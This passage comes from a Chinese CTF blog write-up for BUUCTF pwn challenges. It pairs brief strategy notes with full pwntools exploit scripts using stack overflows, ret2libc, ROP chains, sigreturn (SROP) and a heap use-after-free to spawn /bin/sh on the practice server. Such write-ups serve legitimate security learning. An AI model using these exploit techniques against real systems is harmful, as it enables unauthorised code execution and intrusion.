+<h3 id="exp-21"><a href="#exp-21" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26700</span>)<br><span class="hljs-comment">#p = process(&quot;./ciscn_2019_es_2&quot;)</span><br><br>system_plt = <span class="hljs-number">0x08048400</span><br>lev_ret = <span class="hljs-number">0x080485FD</span><br>main = <span class="hljs-number">0x080485FF</span><br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>payload1 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x8</span><br>p.send(payload1)<br>p.recvuntil(<span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span>)<br>main_ebp = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-comment">#info(hex(main_ebp))</span><br><br>payload2 = <span class="hljs-string">b&#x27;AAAA&#x27;</span> + p32(system_plt) + p32(main) + p32(main_ebp-<span class="hljs-number">0x28</span>) + <span class="hljs-string">b&#x27;/bin/sh&#x27;</span><br>payload2 = payload2.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload2+= p32(main_ebp-<span class="hljs-number">0x38</span>) + p32(lev_ret)<br>p.send(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="HarekazeCTF2019-baby_rop2"></a>HarekazeCTF2019-baby_rop2</h2><h3 id="思路-24"><a href="#思路-24" class="headerlink" title="思路"></a>思路</h3><p>ret2libc</p>
+<h3 id="exp-22"><a href="#exp-22" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">25568</span>)<br><span class="hljs-comment">#p = process(&quot;./babyrop2&quot;)</span><br>elf = ELF(<span class="hljs-string">&quot;./babyrop2&quot;</span>)<br><br>printf_plt = elf.plt[<span class="hljs-string">&quot;printf&quot;</span>]<br>printf_got = elf.got[<span class="hljs-string">&quot;printf&quot;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>main = <span class="hljs-number">0x400636</span><br><br>pop_rdi = <span class="hljs-number">0x400733</span><br>pop_rsi_r15 = <span class="hljs-number">0x400731</span><br>ret = <span class="hljs-number">0x400734</span><br><br>format_s = <span class="hljs-number">0x400790</span><br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>payload1 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">40</span> + p64(pop_rdi) + p64(format_s) +p64(pop_rsi_r15) + p64(read_got) + p64(<span class="hljs-number">0</span>) + p64(printf_plt) + p64(main) + <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">8</span><br>p.recvuntil(<span class="hljs-string">b&quot;name? &quot;</span>)<br>p.sendline(payload1)<br>read_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(read_addr))<br><br>system_addr = read_addr - <span class="hljs-number">0xb1ec0</span><br>binsh = read_addr + <span class="hljs-number">0x95b07</span><br><br>payload2 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">40</span> + p64(pop_rdi) + p64(binsh) + p64(system_addr)<br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h2><h3 id="思路-25"><a href="#思路-25" class="headerlink" title="思路"></a>思路</h3><p>ret2libc<br>这次用的LibcSearcher找libc</p>
+<h3 id="exp-23"><a href="#exp-23" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29615</span>)<br><span class="hljs-comment">#p = process(&quot;./pwn2_sctf_2016&quot;)</span><br>elf = ELF(<span class="hljs-string">&quot;./pwn2_sctf_2016&quot;</span>)<br><br>printf_plt = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>main = <span class="hljs-number">0x080485B8</span><br>call_printf = <span class="hljs-number">0x080485B0</span><br>format_s = <span class="hljs-number">0x08048702</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;read? &#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;-1&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">47</span> + <span class="hljs-string">b&#x27;B&#x27;</span> + p32(printf_plt) + p32(main) + p32(format_s) + p32(printf_got)<br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;B&#x27;</span>)<br>printf_addr = u32(p.recv()[<span class="hljs-number">17</span>:<span class="hljs-number">21</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(printf_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&quot;printf&quot;</span>,printf_addr)<br><br>printf_offset = libc.dump(<span class="hljs-string">&#x27;printf&#x27;</span>)<br>system_offset = libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_offset = libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>libc_base = printf_addr - printf_offset<br>system_addr = libc_base + system_offset<br>binsh = libc_base + binsh_offset<br><br>p.sendline(<span class="hljs-string">b&#x27;-1&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">48</span> + p32(system_addr) + p32(main) + p32(binsh)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop_chain"></a>picoctf_2018_rop_chain</h2><h3 id="思路-26"><a href="#思路-26" class="headerlink" title="思路"></a>思路</h3><p>达成几个条件即可获取flag</p>
+<h3 id="exp-24"><a href="#exp-24" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&#x27;./PicoCTF_2018_rop_chain&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29755</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./PicoCTF_2018_rop_chain&#x27;</span>)<br>gets_plt = elf.plt[<span class="hljs-string">&#x27;gets&#x27;</span>]<br><br>win1 = <span class="hljs-number">0x0804A041</span><br>win2 = <span class="hljs-number">0x0804A042</span><br>flag = <span class="hljs-number">0x0804862B</span><br>a1 = <span class="hljs-number">0xDEADBAAD</span><br>main = <span class="hljs-number">0x0804873B</span><br><br>pop_ebx = <span class="hljs-number">0x804840d</span><br><br>payload1 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">28</span> + p32(gets_plt) + p32(main) + p32(win1) <br>p.recvuntil(<span class="hljs-string">b&quot;input&gt; &quot;</span>)<br>p.sendline(payload1)<br>p.sendline(<span class="hljs-string">b&#x27;\x01\x01&#x27;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">28</span> + p32(flag) + p32(main) + p32(a1)<br>p.recvuntil(<span class="hljs-string">b&#x27;input&gt; &#x27;</span>)<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+<h2 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h2><h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><h3 id="思路-27"><a href="#思路-27" class="headerlink" title="思路"></a>思路</h3><p>泄露栈上的地址，计算偏移，构造’&#x2F;bin&#x2F;sh’字符串<br>之后有两个思路</p>
+<ol>
+<li>利用ROPgadget布置寄存器获取shell</li>
+<li>利用sigreturn布置寄存器获取shell</li>
+</ol>
+<h3 id="exp-25"><a href="#exp-25" class="headerlink" title="exp"></a>exp</h3><h4 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&#x27;./ciscn_s_3&#x27;</span>)<br><span class="hljs-comment">#p = remote(&quot;node5.buuoj.cn&quot;,29806)</span><br><br>mov_rax_59 = <span class="hljs-number">0x4004e3</span><br>mov_addr = <span class="hljs-number">0x400580</span><br>pop_addr = <span class="hljs-number">0x40059A</span><br>syscall = <span class="hljs-number">0x400517</span><br>vuln = <span class="hljs-number">0x4004ed</span><br>ret = <span class="hljs-number">0x400538</span><br>pop_rdi = <span class="hljs-number">0x4005a3</span><br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>payload1 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">16</span><br>payload1+= p64(vuln)<br>p.send(payload1)<br><br><span class="hljs-comment">#print(p.recv())</span><br><br>p.recv(<span class="hljs-number">32</span>)<br>leak=u64(p.recv(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(leak))<br>binsh = leak - <span class="hljs-number">0x148</span><br>ret_addr = binsh + <span class="hljs-number">8</span><br><br>payload2 = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(ret)+p64(pop_addr)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(ret_addr)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)<br>payload2+=p64(mov_addr)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">7</span>*<span class="hljs-number">8</span> + p64(mov_rax_59) +p64(pop_rdi) + p64(binsh) + p64(syscall)<br>p.sendline(payload2)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p = process(<span class="hljs-string">&#x27;./ciscn_s_3&#x27;</span>)<br><span class="hljs-comment">#p = remote(&quot;node5.buuoj.cn&quot;,28047)</span><br><br>mov_rax_15 = <span class="hljs-number">0x4004DA</span><br>mov_rax_59 = <span class="hljs-number">0x4004e3</span><br>mov_addr = <span class="hljs-number">0x400580</span><br>pop_addr = <span class="hljs-number">0x40059A</span><br>syscall = <span class="hljs-number">0x400517</span><br>vuln = <span class="hljs-number">0x4004ed</span><br>ret = <span class="hljs-number">0x400538</span><br>pop_rdi = <span class="hljs-number">0x4005a3</span><br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>payload1 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">16</span><br>payload1+= p64(vuln)<br>p.send(payload1)<br><br><span class="hljs-comment">#print(p.recv())</span><br><br>p.recv(<span class="hljs-number">32</span>)<br>leak=u64(p.recv(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(leak))<br>binsh = leak - <span class="hljs-number">0x118</span><br><br>sigframe = SigreturnFrame()<br>sigframe.rax = constants.SYS_execve<br>sigframe.rdi = binsh<br>sigframe.rsi = <span class="hljs-number">0</span><br>sigframe.rdx = <span class="hljs-number">0</span><br>sigframe.rip = syscall<br><br>payload2 = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="hljs-number">16</span>,<span class="hljs-string">b&#x27;A&#x27;</span>) + p64(mov_rax_15) + p64(syscall) + <span class="hljs-built_in">bytes</span>(sigframe)<br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><h2 id="wustctf2020-getshell"><a href="#wustctf2020-getshell" class="headerlink" title="wustctf2020_getshell"></a>wustctf2020_getshell</h2><h3 id="exp-26"><a href="#exp-26" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./wustctf2020_getshell&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">25919</span>)<br><br>shell = <span class="hljs-number">0x0804851B</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">28</span> + p32(shell)<br><br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h2><h2 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h2><h2 id="actf-2019-babyheap"><a href="#actf-2019-babyheap" class="headerlink" title="actf_2019_babyheap"></a>actf_2019_babyheap</h2><h3 id="思路-28"><a href="#思路-28" class="headerlink" title="思路"></a>思路</h3><p>堆入门题，UAF漏洞</p>
+<h3 id="exp-27"><a href="#exp-27" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>name = <span class="hljs-string">&quot;ACTF_2019_babyheap&quot;</span><br>p = process(name)<br><span class="hljs-comment">#p = remote(&quot;node5.buuoj.cn&quot;,26688)</span><br>elf = ELF(name)<br><br>binsh=<span class="hljs-number">0x602010</span><br>system_plt = elf.plt[<span class="hljs-string">&quot;system&quot;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;Your choice:&quot;</span>,<span class="hljs-string">b&quot;1&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Please input size:&quot;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&quot;Please input content:&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;Your choice:&quot;</span>,<span class="hljs-string">b&quot;2&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Please input list index:&quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;Your choice:&quot;</span>,<span class="hljs-string">b&quot;3&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Please input list index:&quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br>gdb.attach(p)<br><br>create(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">10</span>)<br>create(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">10</span>)<br><span class="hljs-comment">#create(0x100,b&#x27;C&#x27;*10)</span><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>create(<span class="hljs-number">0x10</span>,p64(binsh)+p64(system_plt))<br>show(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+        <a href="/tags/WP/" class="print-no-link">#WP</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>BUUCTF wp</div>
+      <div>https://voidchunk.github.io/2024/05/29/BUUCTF-wp/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>voidchunk</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年5月29日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-cc-nc"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-cc-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/06/03/LitCTF2024-wp/" title="LitCTF2024 wp">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">LitCTF2024 wp</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/27/DragonKnightCTF-wp/" title="DragonKnightCTF wp">
+                        <span class="hidden-mobile">DragonKnightCTF wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"voidchunk/voidchunk.github.io","repo-id":"R_kgDOL3zepA","category":"Announcements","category-id":"DIC_kwDOL3zepM4CftjK","theme-light":"light","theme-dark":"dark","mapping":"pathname","reactions-enabled":0,"emit-metadata":0,"input-position":"top","lang":"zh-CN","loading":"lazy","crossorigin":"anonymous"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
